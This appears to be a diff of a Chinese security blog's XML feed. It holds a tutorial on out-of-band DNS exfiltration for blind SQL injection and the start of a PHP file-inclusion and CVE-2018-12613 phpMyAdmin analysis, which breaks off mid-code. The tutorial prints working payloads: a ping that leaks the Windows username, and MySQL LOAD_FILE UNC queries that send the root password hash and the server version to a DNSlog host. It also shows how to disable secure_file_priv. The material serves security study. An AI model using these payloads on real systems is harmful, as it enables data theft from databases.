href="#2-1-DNSlog工具" class="headerlink" title="2.1 DNSlog工具"></a>2.1 DNSlog工具</h3><p>如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：</p><blockquote><p><a href="https://github.com/BugScanTeam/DNSLog%E3%80%82">https://github.com/BugScanTeam/DNSLog。</a></p></blockquote><p>另外可以使用在线平台：</p><blockquote><ul><li><a href="http://admin.dnslog.link./">http://admin.dnslog.link。</a></li><li><a href="http://ceye.io/">http://ceye.io</a></li></ul></blockquote><h1 id="测试实验"><a href="#测试实验" class="headerlink" title="测试实验"></a>测试实验</h1><p>进行dns隧道的利用之前，得先拥有一个自己的域名（xxx.com），即可控服务器，搭建好VPS环境；<br>这里采用免费平台ceye，对于每个用户，有六个随机字符的唯一标识符代码和唯一子域值，注册完成后会提供唯一的一个二级域名。<br>绑定自己的ip作为NameServer，这样就可以作为DNS服务器，获取Dnslog。通过解析日志获得payload的回显。<br>这里获得子域名是**<strong><strong>.ceye.io，对于所有的DNS quries和HTTP请求**</strong></strong>.ceye.io和*.*<strong>**</strong>.ceye.io将被记录。所有记录都可以从服务器导出，通过处理这些访问日志，可以获取携带信息。</p><p><img src="https://img-blog.csdnimg.cn/202101061559554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="profile"></p><h2 id="1-1-命令测试"><a href="#1-1-命令测试" class="headerlink" title="1.1 命令测试"></a>1.1 命令测试</h2><p>根据ceye的payload介绍进行命令测试。<br>在Windows下，利用username构建一个三级域名</p><blockquote><p>ping %USERNAME%.<strong>**</strong>.ceye.io<br><img src="https://img-blog.csdnimg.cn/20210106160420815.png#pic_center" alt="ping"></p></blockquote><p>可以看见，在dnslog中，出现了携带用户名的dns解析记录。</p><p><img src="https://img-blog.csdnimg.cn/20210106160625939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="DNS Query"></p><h2 id="2-2-SQL注入"><a href="#2-2-SQL注入" class="headerlink" title="2.2 SQL注入"></a>2.2 SQL注入</h2><p>了解了上述内容，终于可以进入正题，SQL注入。</p><p><strong>环境:Mysql</strong><br><strong>测试用例：</strong></p><pre><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.mysql.ip.port.******.ceye.io\\abc&#39;));</code></pre><h3 id="2-2-1-load-file"><a href="#2-2-1-load-file" class="headerlink" title="2.2.1 load_file"></a>2.2.1 load_file</h3><p>load_file()在mysql注入中是经常被使用的一个函数，常用来读取各种配置文件。<br>同时load_file也能都网络资源发起访问。</p><blockquote><p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。<br>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p></blockquote><h3 id="2-2-2-secure-file-priv"><a href="#2-2-2-secure-file-priv" class="headerlink" title="2.2.2 secure_file_priv"></a>2.2.2 secure_file_priv</h3><p>Mysql中，对于文件读写操作，涉及到secure_file_priv这一特性。</p><blockquote><p>在Mysql中，出于安全控制，利用secure-file-priv参数用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>ure_file_priv的值为null ，表示限制mysqld 不允许导入导出；</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入导出做限制</li></ul></blockquote><p>首先进入mysql中，查看该参数</p><p><img src="https://img-blog.csdnimg.cn/20210106161148673.png#pic_center" alt="Linux环境下Mysql"><br>发现文件读写操作限制在了指定目录/var/lib/mysql-files/下，这与要进行的操作不符合，需要取消读写限制。</p><blockquote><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p></blockquote><p>然后重启mysql服务即可生效。<br>再次查看secure_file_priv，</p><p><img src="https://img-blog.csdnimg.cn/20210106161317251.png#pic_center" alt="Windows"><br>Tip：出于一些原因，改换成对windows下的mysql注入测试<br>发现，secure_file_priv值已经为空了，即读写限制被取消了。<br>构造sql语句：</p><pre><code>select load_file(concat(&#39;\\\\&#39;,(@@version),&#39;.******.ceye.io\\abc&#39;));</code></pre><p><img src="https://img-blog.csdnimg.cn/20210106161553215.png#pic_center" alt="payload"><br>查看dnslog<br><img src="https://img-blog.csdnimg.cn/20210106161710246.png#pic_center" alt="Dnslog"><br>成功查询到DNS请求记录，并且mysql的版本信息在解析DNS过程中被携带了出来。</p><h1 id="相关补充"><a href="#相关补充" class="headerlink" title="相关补充"></a>相关补充</h1><p><strong>UNC路径</strong></p><p>UNC通用命名规则，也称通用命名规范、通用命名约定。<br>UNC路径就是类似\softer这样的形式的网络路径。<br>payload中用concat函数拼接了’\\’这一字符串，是因为在该函数中’\’会被当做转义符号，’\‘表示是对’&#39;的转义，所以’\\‘，即表示’\‘。而双斜杠表示网络资源路径，即UNC路径，于是发起了dns请求。<br>Linux环境下部署的mysql，无法利用load_file进行网络资源的访问。尚未找到考据。</p><p>More,<br>Loading……</p>]]></content>
-      
-      
+      <tags>
+        <tag>Python</tag>
+        <tag>Machine learning</tag>
+        <tag>Scikit-learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OOB之DNS隧道利用</title>
+    <url>/blog/2021/01/07/OOB%E4%B9%8BDNS%E9%9A%A7%E9%81%93%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<p>​    在对于注入中，存在无回显的情况，这时候通常使用Blind SQL进行猜解，利用这种方式获取信息，比较麻烦，并且容易因为频繁的数据请求导致ip被BAN。<br>​    OOB通过另一种方式来确认和利用盲注漏洞带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p>
+<a id="more"></a>
+
+<h1 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h1><h2 id="1-什么是OOB"><a href="#1-什么是OOB" class="headerlink" title="1. 什么是OOB"></a>1. 什么是OOB</h2><p>OOB即，带外通道技术。<br>在对于注入中，存在无回显的情况，这时候通常使用Blind SQL进行猜解，利用这种方式获取信息，比较麻烦，并且容易因为频繁的数据请求导致ip被BAN。<br>OOB通过另一种方式来确认和利用盲注漏洞带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。<br>常见的方式是HTTP、ICMP、DNS，ICMP隧道一般会进行防御，TCP在甲方中会有严格的防火墙控制端口，HTTP在甲方中一般也会有严格且完整的监控和阻断机制，DNS隧道在当前环境下，由于需要解析，不会对其进行拦截。利用访问域名，携带信息。<br>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p>
+<h2 id="2-DNSLOG"><a href="#2-DNSLOG" class="headerlink" title="2. DNSLOG"></a>2. DNSLOG</h2><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a><br><img src="https://img-blog.csdnimg.cn/20210106155146376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="DNS查询原理图"></p>
+<blockquote>
+<p><strong>PS：好久以前的笔记了，这张图片忘了出处了，如有冒犯，侵删，抱歉。</strong></p>
+</blockquote>
+<p>如在访问<a href="http://www.scholar.com时/">www.scholar.com时</a><br>流程如下：</p>
+<ol>
+<li>   客户端向一个域名发起请求，首先查询本地DNS；</li>
+<li>   本地查询无果，向根域发起查询请求；</li>
+<li>   根域查询返回.com服务器地址，继续请求.com DNS服务器;</li>
+<li>   .com服务器查询返回.scholar.com地址，继续请求.scholar.com DNS服务器；</li>
+<li>   最后查询www服务器，返回IP。</li>
+</ol>
+<p>可以发现其中scholar 域名服务器是可控的，我们只需要搭建一个scholar DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p>
+<h3 id="2-1-DNSlog工具"><a href="#2-1-DNSlog工具" class="headerlink" title="2.1 DNSlog工具"></a>2.1 DNSlog工具</h3><p>如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：</p>
+<blockquote>
+<p><a href="https://github.com/BugScanTeam/DNSLog%E3%80%82">https://github.com/BugScanTeam/DNSLog。</a></p>
+</blockquote>
+<p>另外可以使用在线平台：</p>
+<blockquote>
+<ul>
+<li><a href="http://admin.dnslog.link./">http://admin.dnslog.link。</a></li>
+<li><a href="http://ceye.io/">http://ceye.io</a></li>
+</ul>
+</blockquote>
+<h1 id="测试实验"><a href="#测试实验" class="headerlink" title="测试实验"></a>测试实验</h1><p>进行dns隧道的利用之前，得先拥有一个自己的域名（xxx.com），即可控服务器，搭建好VPS环境；<br>这里采用免费平台ceye，对于每个用户，有六个随机字符的唯一标识符代码和唯一子域值，注册完成后会提供唯一的一个二级域名。<br>绑定自己的ip作为NameServer，这样就可以作为DNS服务器，获取Dnslog。通过解析日志获得payload的回显。<br>这里获得子域名是**<strong><strong>.ceye.io，对于所有的DNS quries和HTTP请求**</strong></strong>.ceye.io和*.*<strong>**</strong>.ceye.io将被记录。所有记录都可以从服务器导出，通过处理这些访问日志，可以获取携带信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/202101061559554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="profile"></p>
+<h2 id="1-1-命令测试"><a href="#1-1-命令测试" class="headerlink" title="1.1 命令测试"></a>1.1 命令测试</h2><p>根据ceye的payload介绍进行命令测试。<br>在Windows下，利用username构建一个三级域名</p>
+<blockquote>
+<p>ping %USERNAME%.<strong>**</strong>.ceye.io<br><img src="https://img-blog.csdnimg.cn/20210106160420815.png#pic_center" alt="ping"></p>
+</blockquote>
+<p>可以看见，在dnslog中，出现了携带用户名的dns解析记录。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210106160625939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="DNS Query"></p>
+<h2 id="2-2-SQL注入"><a href="#2-2-SQL注入" class="headerlink" title="2.2 SQL注入"></a>2.2 SQL注入</h2><p>了解了上述内容，终于可以进入正题，SQL注入。</p>
+<p><strong>环境:Mysql</strong><br><strong>测试用例：</strong></p>
+<pre><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.mysql.ip.port.******.ceye.io\\abc&#39;));</code></pre>
+<h3 id="2-2-1-load-file"><a href="#2-2-1-load-file" class="headerlink" title="2.2.1 load_file"></a>2.2.1 load_file</h3><p>load_file()在mysql注入中是经常被使用的一个函数，常用来读取各种配置文件。<br>同时load_file也能都网络资源发起访问。</p>
+<blockquote>
+<p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。<br>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
+</blockquote>
+<h3 id="2-2-2-secure-file-priv"><a href="#2-2-2-secure-file-priv" class="headerlink" title="2.2.2 secure_file_priv"></a>2.2.2 secure_file_priv</h3><p>Mysql中，对于文件读写操作，涉及到secure_file_priv这一特性。</p>
+<blockquote>
+<p>在Mysql中，出于安全控制，利用secure-file-priv参数用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
+<ul>
+<li>ure_file_priv的值为null ，表示限制mysqld 不允许导入导出；</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入导出只能发生在/tmp/目录下</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入导出做限制</li>
+</ul>
+</blockquote>
+<p>首先进入mysql中，查看该参数</p>
+<p><img src="https://img-blog.csdnimg.cn/20210106161148673.png#pic_center" alt="Linux环境下Mysql"><br>发现文件读写操作限制在了指定目录/var/lib/mysql-files/下，这与要进行的操作不符合，需要取消读写限制。</p>
+<blockquote>
+<p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
+</blockquote>
+<p>然后重启mysql服务即可生效。<br>再次查看secure_file_priv，</p>
+<p><img src="https://img-blog.csdnimg.cn/20210106161317251.png#pic_center" alt="Windows"><br>Tip：出于一些原因，改换成对windows下的mysql注入测试<br>发现，secure_file_priv值已经为空了，即读写限制被取消了。<br>构造sql语句：</p>
+<pre><code>select load_file(concat(&#39;\\\\&#39;,(@@version),&#39;.******.ceye.io\\abc&#39;));</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210106161553215.png#pic_center" alt="payload"><br>查看dnslog<br><img src="https://img-blog.csdnimg.cn/20210106161710246.png#pic_center" alt="Dnslog"><br>成功查询到DNS请求记录，并且mysql的版本信息在解析DNS过程中被携带了出来。</p>
+<h1 id="相关补充"><a href="#相关补充" class="headerlink" title="相关补充"></a>相关补充</h1><p><strong>UNC路径</strong></p>
+<p>UNC通用命名规则，也称通用命名规范、通用命名约定。<br>UNC路径就是类似\softer这样的形式的网络路径。<br>payload中用concat函数拼接了’\\’这一字符串，是因为在该函数中’\’会被当做转义符号，’\‘表示是对’&#39;的转义，所以’\\‘，即表示’\‘。而双斜杠表示网络资源路径，即UNC路径，于是发起了dns请求。<br>Linux环境下部署的mysql，无法利用load_file进行网络资源的访问。尚未找到考据。</p>
+<p>More,<br>Loading……</p>
+]]></content>
       <categories>
-          
-          <category> WEB安全 </category>
-          
+        <category>WEB安全</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
-            
-            <tag> WEB </tag>
-            
-            <tag> Mysql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文件包含漏洞（一）</title>
-      <link href="/blog/2019/08/27/FI20210127/"/>
-      <url>/blog/2019/08/27/FI20210127/</url>
-      
-        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>&emsp;程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来,就会导致文件信息的泄露甚至注入了恶意代码。</p><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>PHP中常见的包含文件函数</p><ul><li><p>include()</p><p>使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。</p></li><li><p>include_one()</p><p>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次</p></li><li><p>require()</p><p>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p></li><li><p>require_once()</p><p>与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p></li></ul><h3 id="危险配置"><a href="#危险配置" class="headerlink" title="危险配置"></a>危险配置</h3><p><strong>RFI</strong> 远程文件包含相关配置</p><p>allow_url_fopen</p><p>allow_url_include</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>在PHP中</p><ul><li><p><code>php://input</code></p><p>获取post数据，可以用来写木马</p></li><li><p><code>php://filter</code></p><p>经常利用它进行base64编码，读取源代码</p></li><li><p><code>file://</code></p><p>访问本地文件系统，必须用绝对路径</p></li><li><p><code>data://</code></p><p>传输数据</p></li><li><p><code>phar://</code></p><p>解压缩</p></li></ul><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\1678972-20200503145841452-2005716470.png" alt="img"></p><p>（图片来自<a href="https://www.cnblogs.com/Lee-404/p/12821986.html%EF%BC%89">https://www.cnblogs.com/Lee-404/p/12821986.html）</a></p><h2 id="案例CVE-2018-12613-复现分析"><a href="#案例CVE-2018-12613-复现分析" class="headerlink" title="案例CVE-2018-12613 复现分析"></a>案例CVE-2018-12613 复现分析</h2><p>&emsp;phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在phpmyadmin 4.8.1 版本，index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>漏洞入口如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个文件包含，需要满足如下五个条件：</p><ul><li><p>$_REQUEST[‘target’] </p><p><strong>$_REQUEST</strong>是PHP中的超级全局变量，接收表单提交的数据，所以这边首先要满足存在target参数</p></li><li><p>is_string($_REQUEST[‘target’])</p><p><strong>is_string()</strong> 函数用于检测变量是否是字符串。如果指定变量为字符串，则返回 TRUE，否则返回 FALSE。所以target参数需要是一个字符串。</p></li><li><p>! preg_match(‘/^index/‘, $_REQUEST[‘target’])</p><p>**preg_match()**用于执行正则匹配，返回匹配次数，又因为是非贪婪的匹配，所以返回值是0或1。</p><p>搜索target参数中与模式相匹配字符串，并取非，即不能出现index</p></li><li><p>! in_array($_REQUEST[‘target’], $target_blacklist)</p><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。</p><p>target对应的字符串不能出现在 $target_blacklist中</p></li><li><p>Core::checkPageValidity($_REQUEST[‘target’]</p><p>需要满足Core类的checkPageValidity方法判断</p></li></ul><p>前三个条件，很清晰，要求能接收到表单提交的target参数对应的数据，并且该数据是一个不包含”index”字符串的字符串。对于第四点和第五点，我们需要进一步去查看$target_blacklist和checkPageValidity方法到底是什么。</p><p>首先来看一下$target_blacklist这个变量，对应index.php的第50～52行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>不难看出，这里创建了一个索引数组，也就说target不能是import.php或export.php。</p><p>继续来看checkPageValidity方法，在libraries/classes/Core.php文件中的443～476行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$_page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处只传了一个参数$_REQUEST[‘target’]，我们可以先定位第一个if判断，在$whitelist为空的条件下，会引用静态声明的$goto_whitelist。默认的白名单如下所示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这些文件都是可以被包含的。</p><p>第二个if条件，判断$page是否被设置或$page是否为字符串，其中如果$page没有被设置或者$page不是字符串就会返回一个false。</p><p>第三个if条件，判断$page对应的值是否在$whitelist中。</p><p>第四个if条件，以？分割取出前面的字符串，再判断该值是否存在于$goto_whilelist某个数组中。这个判断的作用是在target值含有参数的情况下，phpmyadmin也能正确的包含文件。</p><p>具体的来说，先要知道mb_strpos(haystack,needle)的作用是返回要查找的字符串在别一个字符串中首次出现的位置，这里haystack代表被检索字符串，needle表示需要查询的字符。</p><p>再来看这一行，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 